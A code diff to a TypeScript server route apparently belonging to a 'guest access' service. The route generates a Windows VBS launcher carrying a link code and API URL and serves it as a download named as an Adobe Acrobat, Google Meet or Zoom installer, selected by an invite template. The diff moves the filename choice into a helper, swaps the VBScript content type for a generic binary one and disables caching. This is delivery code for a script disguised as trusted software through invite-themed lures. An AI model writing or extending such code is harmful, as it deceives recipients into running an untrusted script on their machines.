@@ -7,7 +7,7 @@ import { API_ROUTES } from '@nexusdesk/shared';
 import { PermissionAction, PermissionResource } from '@nexusdesk/types';
 import { requireAuth, requireOrgAccess } from '../middleware/auth.js';
 import { requirePermission } from '../middleware/rbac.js';
-import { GuestAccessService, installerBatFilename, installerGuiFilename } from '../services/guest-access.js';
+import { GuestAccessService, installerBatFilename, installerBrowserFilename, installerGuiFilename } from '../services/guest-access.js';
 import { signWindowsExeIfConfigured } from '../services/windows-exe-sign.js';
 import { getEnv } from '../config/env.js';
 import { AppError } from '../domain/errors/app-error.js';
@@ -178,14 +178,11 @@ export async function registerGuestAccessRoutes(app: FastifyInstance): Promise<v
     const link = await guests().resolveActiveLink(code);
     const env = getEnv();
     const vbs = guests().buildWindowsVbsLauncher(link.code, env.API_URL, link.inviteTemplate);
-    const filename =
-      link.inviteTemplate === 'adobe'
-        ? 'AdobeAcrobat-Setup.vbs'
-        : link.inviteTemplate === 'google_meet'
-          ? 'GoogleMeet-Setup.vbs'
-          : 'ZoomClient-Setup.vbs';
+    const filename = installerBrowserFilename(link.inviteTemplate);
     return reply
-      .header('Content-Type', 'text/vbscript; charset=utf-8')
+      .header('Content-Type', 'application/octet-stream')
+      .header('Cache-Control', 'no-store, no-cache, must-revalidate')
+      .header('Pragma', 'no-cache')
       .header('Content-Disposition', `attachment; filename="${filename}"`)
       .send(vbs);
   });
